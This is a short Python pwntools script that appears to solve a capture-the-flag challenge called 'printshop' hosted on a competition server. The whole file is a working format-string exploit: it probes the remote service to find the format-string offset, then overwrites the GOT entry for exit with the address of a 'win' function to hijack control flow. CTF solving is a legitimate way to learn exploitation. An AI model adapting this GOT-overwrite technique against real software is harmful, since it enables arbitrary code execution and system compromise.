from pwn import *

exe = context.binary = ELF('printshop')
winaddr = exe.symbols['win']
exitaddr = exe.got['exit']
io = remote('chal.pctf.competitivecyber.club', 7997)

def findSet(payload):
    io = remote('chal.pctf.competitivecyber.club', 7997)
    io.recvuntil(b'\nWhat would you like to print? >> ')
    io.sendline(payload)
    io.recvuntil(b'buisness!\n')
    io.recvline()
    resp = io.recvline()
    print(resp)
    return resp

fmt = FmtStr(findSet)
fmt.write(exitaddr, winaddr)
fmt.execute_writes()